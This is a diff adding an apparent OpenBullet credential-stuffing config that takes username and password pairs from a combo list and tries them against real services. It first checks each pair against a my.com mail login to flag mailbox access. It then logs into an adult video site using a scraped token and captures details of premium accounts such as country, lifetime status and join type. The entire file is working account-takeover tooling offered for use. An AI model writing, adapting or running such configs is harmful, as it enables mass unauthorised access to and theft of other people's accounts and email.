@@ -1,0 +1,129 @@
+[SETTINGS]
+{
+  "Name": "PORNHUB",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-21T22:14:34.0769082+01:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=<USER>&Password=<PASS>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "Ok=" "" -> VAR "resp1" 
+
+FUNCTION Translate 
+  KEY "1" VALUE "True" 
+  KEY "0" VALUE "False" 
+  "<resp1>" -> VAR "resp" 
+
+REQUEST GET "https://fr.pornhub.com" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "token                           = \"" "\";" -> VAR "tok" 
+
+PARSE "<SOURCE>" LR "            value=\"" "\"" -> VAR "red" 
+
+FUNCTION URLDecode "redirect=<red>&intended_action=&user_id=&token=<tok>&remember_me=1&from=pc_login_modal_:index&username=<USER>&password=<PASS>&subscribe=undefined&setSendTip=false" -> VAR "post" 
+
+REQUEST POST "https://fr.pornhub.com/front/authenticate" 
+  CONTENT "<post>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "username" -> VAR "name" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":\"1\"" 
+  KEYCHAIN Failure OR 
+    KEY "success\":\"0\",\"" 
+
+REQUEST GET "https://www.pornhubpremium.com/user/manage/start" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "Join Type\":\"" 
+
+PARSE "<SOURCE>" LR "\"User Type\":\"" "\",\"Device Type" -> VAR "usertype" 
+
+PARSE "<SOURCE>" LR "Biller Country\":\"" "\",\"Re" -> VAR "count" 
+
+PARSE "<SOURCE>" LR "\"Latest Product Used\":\"" "\",\"Last Login" -> VAR "lp" 
+
+PARSE "<SOURCE>" LR "User Joined\":\"" " " -> VAR "joinedin" 
+
+PARSE "<SOURCE>" LR "Join Type\":\"" "\",\"" -> VAR "jt" 
+
+PARSE "<SOURCE>" LR ", as an elite " "of <a href=\"https://www" -> VAR "life" 
+
+IF "<life>" CONTAINS ""
+
+FUNCTION Constant "False" -> VAR "stat" 
+
+FUNCTION Constant " [ UserName : <name> - Country : <count> - isLifeTime : <stat> - isMailAccess : <resp> - userType : <usertype> - LastProduct : <lp> - JoinedIn : <joinedin> - joinType : <jt> ] " -> CAP "Full-Info" 
+
+ENDIF
+IF "<life>" CONTAINS "Lifetime"
+
+FUNCTION Constant "True" -> VAR "stat" 
+
+FUNCTION Constant " [ UserName : <name> - Country : <count> - isLifeTime : <stat> - isMailAccess : <resp> - userType : <usertype> - LastProduct : <lp> - JoinedIn : <joinedin> - joinType : <jt> ] " -> CAP "Full-Info" 
+
+ENDIF
+  
